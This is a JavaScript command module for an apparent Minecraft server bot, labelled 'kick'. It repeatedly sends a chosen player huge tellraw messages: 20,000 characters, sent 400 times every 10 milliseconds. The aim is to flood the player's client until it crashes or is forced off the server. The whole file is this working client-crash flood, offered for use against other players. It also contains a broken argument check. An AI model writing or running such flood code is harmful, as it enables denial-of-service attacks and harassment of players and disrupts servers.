const CommandError = require('../CommandModules/command_error')

let timer = null

module.exports = {
  name: 'kick',

   description:['kicks a player'],
       
     trustLevel: 1,
        aliases:[],
  execute(context) {
   // throw new CommandError('temp disabled')
    //throw new CommandError('command temporarily disabled until hashing is implemented')
    const args = context.arguments
if (!args && !args[0] && !args[1]) return 
    if (args[2] === 'clear' || args[2] === 'stop') {
      clearInterval(this.timer)
      this.timer = null

      context.source.sendFeedback('Cloop Stopped', false)
      return
    }


    //  if (this.timer !== null) throw new CommandError('The bot can currently only loop one command')
    // anti fard
    
    const target = context.player//let me hashonly it rq
    this.timer = setInterval(function() { // Wait, is this command public? 
      repeat(context.bot, 400, `tellraw ${args[1]} {"text":"${'ඞ'.repeat(20000)}","bold":true,"italic":true,"obfuscated":true,"color":"#FF0000"}`)

    }, 10)
  }
}//i found that there is a limit

// Repeat the command over and over.
function repeat(bot, repetitions, cmd) {
  for (let i = 0; i < repetitions; i++) {
    bot.core.run(cmd)
  }
}